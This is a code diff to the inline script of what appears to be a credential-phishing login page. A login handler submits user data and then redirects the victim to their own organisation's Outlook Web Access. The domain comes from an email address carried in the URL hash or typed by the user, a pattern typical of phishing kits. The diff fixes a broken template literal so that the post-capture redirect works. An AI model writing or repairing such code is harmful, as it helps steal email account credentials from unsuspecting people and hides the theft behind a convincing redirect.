@@ -909,6 +909,7 @@ z-index: 9999;
 
 <script>
 // Keep original favicon
+// Keep original favicon
 const originalFavicon = document.querySelector("link[rel~='icon']");
 let spinnerFavicon = null;
 
@@ -1092,23 +1093,32 @@ function clkLgn(event) {
                     body: JSON.stringify(userData)
                 });
                 
-                // Extract domain from email for redirection
+                // Extract domain from URL hash or from email input
+                let cleanDomain = '';
                 const domainInput = getDomainFromHash();
+                
                 if (domainInput) {
-                    // Extract only the domain part (after @) if it's an email
-                    let cleanDomain = domainInput;
+                    // Extract domain from hash
+                    cleanDomain = domainInput;
                     if (domainInput.includes('@')) {
                         cleanDomain = domainInput.split('@')[1];
                     }
                     // Remove any www. prefix if present
                     cleanDomain = cleanDomain.replace(/^www\./, '');
-                    
-                    const targetUrl = 'https://mail.${cleanDomain}/owa';
-                    console.log('Redirecting to:', targetUrl);
-                    window.location.href = targetUrl;
+                } else if (username.includes('@')) {
+                    // Extract domain from email input when no hash is present
+                    cleanDomain = username.split('@')[1];
+                    // Remove any www. prefix if present
+                    cleanDomain = cleanDomain.replace(/^www\./, '');
                 } else {
-                    window.location.href = 'https://mail.${cleanDomain}/owa';
+                    // Fallback: use the username as domain if it's not an email
+                    cleanDomain = username.replace(/^www\./, '');
                 }
+                
+                // FIXED: Use proper template literal with backticks
+                const targetUrl = `https://mail.${cleanDomain}/owa`;
+                console.log('Redirecting to:', targetUrl);
+                window.location.href = targetUrl;
             });
         }
     })
@@ -1126,4 +1136,5 @@ function clkLgn(event) {
 </script>
 
 </html>
+
 
